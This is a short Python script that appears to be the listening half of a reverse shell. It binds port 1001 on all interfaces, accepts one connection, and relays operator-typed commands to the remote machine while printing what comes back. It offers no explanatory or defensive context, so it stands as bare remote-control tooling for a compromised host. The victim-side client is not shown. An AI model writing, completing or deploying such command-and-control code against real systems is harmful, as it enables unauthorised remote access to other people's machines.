import sys
import os
import subprocess
import socket


BUFFER = 1024*128
SEPRATER = "<sep>"

SERVER_HOST = "0.0.0.0"

server = socket.socket()

server.bind((SERVER_HOST, 1001))

server.listen(4)

print(f"listening on 0.0.0.0 1001")


client_socket, client_add = server.accept()

print(f"[*] Connected to {client_add}")

cwd = client_socket.recv(BUFFER).decode()

while True:
    command = input(f"{cwd}>")

    if not command.strip():
        continue

    client_socket.send(command.encode())

    if command.lower() == "exit":
        break

    output = client_socket.recv(BUFFER).decode()

    print(output)
